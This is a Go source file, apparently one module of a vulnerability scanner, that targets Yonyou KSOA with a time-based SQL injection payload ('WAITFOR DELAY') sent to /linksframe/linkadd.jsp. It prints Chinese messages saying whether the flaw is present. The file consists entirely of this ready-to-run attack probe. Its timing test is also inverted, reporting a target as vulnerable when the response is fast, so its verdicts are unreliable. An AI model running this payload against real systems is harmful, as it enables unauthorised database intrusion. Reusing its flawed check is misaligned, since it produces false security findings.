package KSOA_sqljni

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(7 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

//https://blog.csdn.net/qq_41904294/article/details/134981039?spm=1001.2014.3001.5502

func Run(url string) {
	url = url + "/linksframe/linkadd.jsp?id=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27"
	startTime := time.Now()
	_, err := client.R().SetHeaders(map[string]string{ // Set multiple headers at once
		"User-Agent": UA,
	}).Get(url)
	if err != nil {
		color.Red.Println("[-] 用友时空 KSOA 多处SQL注入漏洞不存在")
		return
	}
	endTime := time.Now()
	duration := endTime.Sub(startTime)
	if duration <= 5*time.Second {
		color.Green.Println("[+] 用友时空 KSOA 多处SQL注入漏洞存在 -> " + url)
		return
	}
	color.Red.Println("[-] 用友时空 KSOA 多处SQL注入漏洞不存在")
}
